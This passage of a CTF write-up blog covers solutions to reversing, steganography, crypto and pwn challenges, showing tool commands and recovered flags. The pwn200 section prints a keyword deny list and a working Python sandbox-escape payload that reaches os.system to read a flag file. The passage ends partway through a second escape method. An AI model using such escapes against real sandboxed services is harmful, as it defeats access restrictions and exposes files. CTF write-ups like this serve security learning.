<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat rev100 <span class="p">|</span>awk <span class="s1">&#39;{print $2$3$4$5$6$7$8$9$10$11$12$13$14$15$16$17}&#39;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\r\n&#39;</span>
68666C000048BF0100000000000000488D342448BA020000000000000048B80...snip...</code></pre></div>


<p>Now <code>radare2</code> comes to the rescue again! Notice the <code>-b 64</code> flag to specify x64 code.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>rasm2 -b <span class="m">64</span> -d <span class="s2">&quotquot;</span>
push dword 0x6c66
mov rdi, 0x1
lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
mov rdx, 0x2
mov rax, 0x1
syscall
push dword 0x6761
mov rdi, 0x1
lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
mov rdx, 0x2
mov rax, 0x1
syscall
..snip...
push dword 0xa7d
mov rdi, 0x1
lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
mov rdx, 0x2
mov rax, 0x1
syscall
xor rdi, rdi
mov rax, 0x3c
syscall</code></pre></div>


<p>Looks like it wants to use syscall to print characters to the screen. Instead, I extract the values:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>rasm2 -b <span class="m">64</span> -d <span class="s2">&quotquot;</span> <span class="p">|</span> grep <span class="s2">&quot;push dword&quot;</span> <span class="p">|</span>awk <span class="s1">&#39;{print $3}&#39;</span>
0x6c66
0x6761
0x707b
0x706f
0x6f70
0x7270
0x7465
0xa7d</code></pre></div>


<p><code>xxd -p -r</code> helps to read these bytes.</p>

<p><code>flag{poppopret}</code></p>

<h1>rev200</h1>

<p>This was an annoying challenge. I sort of knew what to do, but couldn&rsquo;t get the proper tools running. The zip file seems to contain an APK file. I tried to run it in an emulator, but did not succeed. I tried four different disassembler and struck gold with <a href="http://code.google.com/p/android-apktool">android-apktool</a>. This tool could disassemble the APK file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">java -jar apktool.jar -d ./rev200.apk</code></pre></div>


<p>Grepping the files for &lsquo;flag&rsquo; only returned a string id starting with &ldquo;0x7f0..&rdquo; but this was of no use. I started looking at each file, but one stuck out:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/apktool1.5.2/rev200/smali/ctf/crackme<span class="nv">$ </span>cat FlagActivity.smali</code></pre></div>




<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="o">.</span><span class="na">class</span> <span class="kd">public</span> <span class="n">Lctf</span><span class="o">/</span><span class="n">crackme</span><span class="o">/</span><span class="n">FlagActivity</span><span class="o">;</span>
<span class="o">.</span><span class="na">super</span> <span class="n">Landroid</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">Activity</span><span class="o">;</span>
<span class="o">.</span><span class="na">source</span> <span class="s">&quot;FlagActivity.java&quot;</span>


<span class="o">...</span><span class="na">snip</span><span class="o">...</span>

    <span class="o">.</span><span class="na">line</span> <span class="mi">20</span>
    <span class="o">.</span><span class="na">end</span> <span class="n">local</span> <span class="n">v2</span>           <span class="err">#</span><span class="nl">flagText:</span><span class="n">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="n">TextView</span><span class="o">;</span>
    <span class="o">:</span><span class="n">cond_0</span>
    <span class="n">aget</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v0</span><span class="o">,</span> <span class="n">v3</span>

    <span class="kt">int</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="kt">char</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v4</span>

    <span class="n">invoke</span><span class="o">-</span><span class="kd">static</span> <span class="o">{</span><span class="n">v4</span><span class="o">},</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;-&gt;</span><span class="n">valueOf</span><span class="o">(</span><span class="n">C</span><span class="o">)</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;</span>

    <span class="n">move</span><span class="o">-</span><span class="n">result</span><span class="o">-</span><span class="n">object</span> <span class="n">v4</span>

    <span class="n">invoke</span><span class="o">-</span><span class="n">virtual</span> <span class="o">{</span><span class="n">v1</span><span class="o">,</span> <span class="n">v4</span><span class="o">},</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;-&gt;</span><span class="n">concat</span><span class="o">(</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;)</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;</span>

    <span class="n">move</span><span class="o">-</span><span class="n">result</span><span class="o">-</span><span class="n">object</span> <span class="n">v1</span>

    <span class="o">.</span><span class="na">line</span> <span class="mi">19</span>
    <span class="n">add</span><span class="o">-</span><span class="kt">int</span><span class="o">/</span><span class="n">lit8</span> <span class="n">v3</span><span class="o">,</span> <span class="n">v3</span><span class="o">,</span> <span class="mh">0x1</span>

    <span class="k">goto</span> <span class="o">:</span><span class="n">goto_0</span>

    <span class="o">.</span><span class="na">line</span> <span class="mi">17</span>
    <span class="n">nop</span>

    <span class="o">:</span><span class="n">array_0</span>
    <span class="o">.</span><span class="na">array</span><span class="o">-</span><span class="n">data</span> <span class="mh">0x4</span> 
        <span class="mh">0x66</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6c</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x61</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x67</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x7b</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x77</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6e</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6e</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6a</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x72</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6d</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x79</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x5f</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x64</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x33</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x78</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x7d</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
    <span class="o">.</span><span class="na">end</span> <span class="n">array</span><span class="o">-</span><span class="n">data</span>
<span class="o">.</span><span class="na">end</span> <span class="n">method</span></code></pre></div>


<p><code>flag{w4nn4_j4r_my_d3x}</code></p>

<h1>rev300 &ldquo;elrond32&rdquo;</h1>

<p>The challenge name was a big hint. Apparently, &lsquo;Elrond&rsquo; is linked to Lord of the Rings. The zip file contains a Linux ELF binary. Upon running the binary, all I got was <code>Access Denied</code>. Disassembling in <code>gdb</code> and analysis showed that the program takes exactly one argument. The length of this string must be exactly 8, no more, no less. The program then starts to compare the values of each byte. It jumps to the relative sections of code using a jumptable. I first did:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>objdump -d rev300 <span class="p">|</span>grep <span class="s2">&quot;cmp &quot;</span>         
 80483b6:   <span class="m">39</span> d8                    cmp    %ebx,%eax
 80483d4:   <span class="m">39</span> d8                    cmp    %ebx,%eax
 8048439:   3c 6e                   cmp    <span class="nv">$0x6e</span>,%al
 8048451:   3c <span class="m">72</span>                    cmp    <span class="nv">$0x72</span>,%al
 8048469:   3c <span class="m">64</span>                    cmp    <span class="nv">$0x64</span>,%al
 804847d:   3c <span class="m">65</span>                    cmp    <span class="nv">$0x65</span>,%al
 8048491:   3c <span class="m">69</span>                    cmp    <span class="nv">$0x69</span>,%al
 80484a5:   3c <span class="m">61</span>                    cmp    <span class="nv">$0x61</span>,%al
 80484b9:   3c <span class="m">67</span>                    cmp    <span class="nv">$0x67</span>,%al
 80484ca:   3c <span class="m">73</span>                    cmp    <span class="nv">$0x73</span>,%al
 8048675:   <span class="m">39</span> fe                    cmp    %edi,%esi
 80486ac:   <span class="m">83</span> f8 ff                 cmp    <span class="nv">$0xffffffff</span>,%eax
 80486bf:   <span class="m">83</span> f8 ff                 cmp    <span class="nv">$0xffffffff</span>,%eax</code></pre></div>


<p>This already narrowed down the possible values for each byte quite a lot! Apparently, the program checks for the byte values &ldquo;sgnrdeia&rdquo;. I looked up the jumptable and started debugging the program.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>x/8x 0x8048720
0x8048720:  0x0804848b  0x08048477  0x080484d5  0x08048433
0x8048730:  0x08048463  0x0804849f  0x080484b3  0x080484c4</code></pre></div>


<p>When I was writing down the values the program was checking against, I was making a mistake and wrote down &lsquo;in.n&rsquo;. I looked at the rest of the letters and for some reason it clicked. I got lucky!</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>./rev300 isengard
Access granted</code></pre></div>


<p><code>flag{s0me7hing_S0me7hinG_t0lki3n}</code></p>

<h1>stego100</h1>

<p>Stego can be extremely hard but also quite fun once you &lsquo;get&rsquo; it. The zip file contained a PNG image showing the three vikings from The Lost Vikings. I did not notice any strange artifacts in the image so I ran <code>strings</code> on the image just to be sure.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>strings stego100
LdfO<span class="p">;</span>
<span class="c">#tEXthint</span>
http://i.imgur.com/22kUrzm.png
IEND</code></pre></div>


<p>Hmm. Another PNG? It looked like the exact same image, but the file sizes differed. I tried to subtract the second image from the first in GIMP but that didn&rsquo;t work. I spent quite some time on it and I finally got it using <code>imagemagick</code>:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">compare 22kUrzm.png stego100 diff.png</code></pre></div>


<p>This created a difference file from both PNGs. This file had a very obvious QR code:</p>

<p><img src="http://barrebas.github.io/assets/stego100-diff.png" alt="" /></p>

<p>Scanning this QR code with a smartphone yielded <code>flag{#justdiffit}</code></p>

<h1>cry100</h1>

<p>The first and easiest crypto challenge. The zip file contained a text file with the following content:</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">XMVZGC RGC AMG RVMG HGFGMQYCD VT VWM BYNO, NSVWDS NSGO RAO XG UWFN AF 
HACDGMVWF. AIRVFN AII AMG JVRRVC-XVMC, FYRBIG TVIZ ESV SAH CGQGM XGGC 
RVMG NSAC A RYIG TMVR NSG SVWFG ESGMG NSGO EGMG XVMC WCNYI NSG HAO 
FVRG IVMH JARG MVWCH NV NAZG NSGR VTT NV EAM. OVWM TIAD YF &quot;CV NSYF 
YF CVN JMOBNV RO HGAM&quot;, YC IVEGMJAFG, EYNS WCHGMFJVMGF YCFNGAH VT 
FBAJGF, FWMMVWCHGH XO NSG WFWAI &quot;TIAD&quot; NAD ACH JWMIO XMAJGF. GCUVO.</code></pre></div>


<p>This looked like either a Caesar cipher or a substitution cipher. Luckily, <a href="http://quipqiup.com/index.php">online solvers</a> exist.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">BROKEN MEN ARE MORE DESERVING OF OUR PITY, THOUGH THEY MAY BE JUST AS  DANGEROUS. ALMOST ALL ARE COMMON-BORN, SIMPLE FOLK WHO HAD NEVER BEEN  MORE THAN A MILE FROM THE HOUSE WHERE THEY WERE BORN UNTIL THE DAY  SOME LORD CAME ROUND TO TAKE THEM OFF TO WAR. YOUR FLAG IS &#39;NO THIS  IS NOT CRYPTO MY DEAR&#39;, IN LOWERCASE, WITH UNDERSCORES INSTEAD OF  SPACES, SURROUNDED BY THE USUAL &#39;FLAG&#39; TAG AND CURLY BRACES. ENJOY.</code></pre></div>


<p><code>flag{no_this_is_not_crypto_my_dear}</code></p>

<h1>cry300</h1>

<p>A fun one! I read PoC||GTFO a lot, and the name of the challenge and the file screamed <code>electronic coloring book</code>. For more info, grab a copy of PoC||GTFO 0x05 from a neighbourly neighbour. The idea is that the image file, a 4k still, is encrypted with ECB, but this block cipher is very bad a encrypting. Repeated blocks can be &lsquo;colored&rsquo; in using <a href="https://github.com/doegox/ElectronicColoringBook/blob/master/ElectronicColoringBook.py">this script</a>.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>python colorbook.py -x <span class="m">3840</span> ecb.bmp</code></pre></div>


<p>The image is still a bit mangled, but after flipping the image vertically, the flag is legible:</p>

<p><img src="http://barrebas.github.io/assets/cry300.png" alt="" /></p>

<p><code>flag{no_penguin_here}</code></p>

<h1>pwn200</h1>

<p>A python jail! This reminded me of the CSAW python jail, but simpler. Upon connecting to the ip address, the user is dropped in a python shell. However, we can&rsquo;t use commands that contain</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">prohibited_keywords</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s">&quot;import&quot;</span><span class="p">,</span>
        <span class="s">&quot;open&quot;</span><span class="p">,</span>
        <span class="s">&quot;flag&quot;</span><span class="p">,</span>
        <span class="s">&quot;eval&quot;</span><span class="p">,</span>
        <span class="s">&quot;exec&quot;</span>
    <span class="p">]</span></code></pre></div>


<p>Now, we wanna read the flag somehow. I found <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">this writeup</a> to be very helpful. I followed that approach, abusing <code>().__class__.__base__.__subclasses__()</code> to finally call <code>os</code>. I still have no profound understanding of breaking python jails, but this and the CSAW example definitely helped.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="mf">54.69</span><span class="o">.</span><span class="mf">118.120</span> <span class="mi">6000</span>

<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Safe</span> <span class="n">Interactive</span> <span class="n">CPython</span> <span class="n">Shell</span> <span class="p">(</span><span class="n">SICS</span><span class="p">)</span>
<span class="o">================================================</span>

<span class="n">Rules</span><span class="p">:</span> 
    <span class="o">-</span> <span class="n">Wash</span> <span class="n">your</span> <span class="n">dishes</span>
    <span class="o">-</span> <span class="n">Don</span><span class="s">&#39;t eat the yellow snow</span>
    <span class="o">-</span> <span class="n">Do</span> <span class="ow">not</span> <span class="kn">import</span> <span class="nn">anything</span>
    <span class="o">-</span> <span class="n">No</span> <span class="n">peeking</span> <span class="n">at</span> <span class="n">files</span><span class="err">!</span>

<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
<span class="p">[</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;type&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakref&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakcallableproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;int&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;basestring&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bytearray&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;list&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NoneType&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NotImplementedType&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;traceback&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;super&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;xrange&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;dict&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;set&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;slice&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;staticmethod&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;complex&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;float&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;buffer&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;long&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;frozenset&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;property&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;tuple&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;enumerate&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;reversed&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;code&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;frame&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;builtin_function_or_method&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;instancemethod&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;function&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;classobj&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;dictproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;generator&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;getset_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;wrapper_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;instance&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;ellipsis&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;member_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;sys.floatinfo&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;EncodingMap&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;sys.flags&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;exceptions.BaseException&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;module&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;imp.NullImporter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;zipimport.zipimporter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;posix.stat_result&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;posix.statvfs_result&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">warnings</span><span class="o">.</span><span class="n">WarningMessage</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Hashable</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="nb">classmethod</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Iterable</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Sized</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Container</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Callable</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">_Printer</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">_Helper</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="n">pwd</span><span class="o">.</span><span class="n">struct_passwd</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="nb">file</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">Quitter</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalEncoder</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalDecoder</span><span class="s">&#39;&gt;]</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span>
<span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s">&#39;&gt;</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">&quot;linecache&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cat /home/pybaby/flag&#39;</span><span class="p">)</span>
<span class="c">#rekt</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">&quot;linecache&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cat /home/pybaby/flag.txt&#39;</span><span class="p">)</span>
<span class="c">#rekt</span>
<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
<span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">&quot;linecache&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cat /home/pybaby/f*&#39;</span><span class="p">)</span>    
<span class="n">flag</span><span class="p">{</span><span class="n">python_sandboxing</span><span class="p">:</span><span class="n">_harder_than_teaching_your_mom_dota</span><span class="p">}</span><span class="mi">0</span></code></pre></div>


<p><code>flag{python_sandboxing:_harder_than_teaching_your_mom_dota}</code></p>

<p>I just figured out another way to beat this one, using <code>__builtins__</code>. First, we need to get a way to call <code>open</code> without actually using the phrase &lsquo;open&rsquo;. We can display all the builtin functions like so:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
